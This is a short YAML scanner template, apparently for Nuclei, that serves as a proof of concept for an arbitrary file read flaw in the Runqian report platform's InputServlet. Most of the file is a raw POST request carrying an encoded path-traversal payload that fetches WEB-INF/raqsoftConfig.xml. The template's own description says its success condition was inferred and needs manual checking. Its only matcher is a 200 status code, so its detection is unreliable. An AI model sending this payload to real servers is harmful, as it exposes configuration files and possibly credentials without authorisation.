id: poc-ngbzgg3zk8nvemn7
info:
  name: 润乾报表平台InputServlet存在任意文件读取漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: lfi,2024
http:
- raw:
  - 'POST /InputServlet?action=13 HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0

    Content-Type: application/x-www-form-urlencoded

    Connection: close

    file=%2F%5C..%5C%5C..%5C%5CWEB-INF%5C%5CraqsoftConfig.xml&upFileName=web.config'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
